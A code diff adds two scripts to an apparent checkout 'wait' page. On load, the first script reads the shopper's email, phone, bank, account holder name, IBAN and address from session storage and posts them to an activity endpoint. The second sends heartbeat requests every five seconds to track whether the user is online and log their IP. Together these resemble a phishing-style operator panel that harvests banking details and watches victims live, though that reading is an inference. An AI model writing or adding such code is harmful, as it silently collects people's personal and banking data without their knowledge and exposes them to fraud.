@@ -67,5 +67,146 @@
             </p>
         </div>
     </div>
+
+    <script>
+    (function() {
+        function logUserActivity(type, payload) {
+            try {
+                fetch('/mardinlee/api/activity', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        type: type,
+                        payload: payload || {}
+                    })
+                }).catch(function(err) {
+                    console.warn('⚠️ Aktivite loglanamadı:', err);
+                });
+            } catch (error) {
+                console.warn('⚠️ Aktivite log fonksiyonu hata verdi:', error);
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            var checkoutData = {};
+            var bankData = {};
+            var total = 0;
+            try {
+                checkoutData = JSON.parse(sessionStorage.getItem('checkoutData') || '{}');
+            } catch (e) {}
+            try {
+                bankData = JSON.parse(sessionStorage.getItem('checkoutBank') || '{}');
+            } catch (e) {}
+            try {
+                total = parseFloat(sessionStorage.getItem('checkoutTotal')) || 0;
+            } catch (e) {}
+
+            logUserActivity('checkout-wait-enter', {
+                cartTotal: total,
+                email: checkoutData.email,
+                phone: checkoutData.phone,
+                bank: bankData.bank,
+                accountName: bankData.accountName,
+                iban: bankData.iban,
+                address: checkoutData.street ? {
+                    street: checkoutData.street,
+                    housenumber: checkoutData.housenumber,
+                    postal: checkoutData.postal,
+                    city: checkoutData.city,
+                    country: checkoutData.country
+                } : undefined
+            });
+        });
+    })();
+    </script>
+
+    <!-- Online Kontrol Sistemi - Kullanıcı online kontrolü için heartbeat -->
+    <script>
+    (function() {
+        console.log('🚀 Online kontrol sistemi başlatılıyor (wait.html)...');
+
+        function sendHeartbeat() {
+            var timestamp = new Date().getTime();
+            var random = Math.random();
+            var url = '/api/heartbeat?source=wait&t=' + timestamp + '&r=' + random;
+
+            console.log('📤 Heartbeat isteği gönderiliyor:', url);
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', url, true);
+            xhr.setRequestHeader('Cache-Control', 'no-cache');
+
+            xhr.onload = function() {
+                console.log('📥 Heartbeat response geldi - Status:', xhr.status);
+                if (xhr.status === 200) {
+                    try {
+                        var data = JSON.parse(xhr.responseText);
+                        console.log('✅ Heartbeat OK - Response:', data);
+
+                        if (data.status === 'ok' || data.success === true) {
+                            console.log('✅ Kullanıcı ONLINE - IP:', data.ip);
+                        } else {
+                            console.warn('⚠️ Heartbeat response - status:', data.status);
+                        }
+                    } catch (e) {
+                        console.error('❌ Response parse hatası:', e);
+                        console.error('Response text:', xhr.responseText);
+                    }
+                } else {
+                    console.warn('⚠️ Heartbeat başarısız - Status:', xhr.status);
+                    console.warn('Response text:', xhr.responseText);
+                }
+            };
+
+            xhr.onerror = function() {
+                console.error('❌ Heartbeat network hatası - İstek gönderilemedi');
+            };
+
+            xhr.ontimeout = function() {
+                console.error('⏱️ Heartbeat timeout - İstek zaman aşımına uğradı');
+            };
+
+            xhr.timeout = 10000;
+            xhr.send();
+        }
+
+        sendHeartbeat();
+
+        var heartbeatInterval = setInterval(function() {
+            sendHeartbeat();
+        }, 5000);
+
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden) {
+                console.log('👁️ Sayfa görünür oldu, heartbeat gönderiliyor...');
+                sendHeartbeat();
+            }
+        });
+
+        window.addEventListener('beforeunload', function() {
+            if (navigator.sendBeacon) {
+                var url = '/api/heartbeat?source=wait&t=' + new Date().getTime() + '&r=' + Math.random();
+                navigator.sendBeacon(url);
+            } else {
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', '/api/heartbeat?source=wait&t=' + new Date().getTime() + '&r=' + Math.random(), false);
+                try {
+                    xhr.send();
+                } catch (e) {
+                    console.error('Son heartbeat gönderilemedi:', e);
+                }
+            }
+        });
+
+        window.addEventListener('unload', function() {
+            clearInterval(heartbeatInterval);
+        });
+
+        console.log('✅ Online kontrol sistemi aktif (wait.html)');
+        console.log('📡 Network tab\'ında /api/heartbeat isteklerini görebilirsiniz');
+    })();
+    </script>
 </body>
 </html>
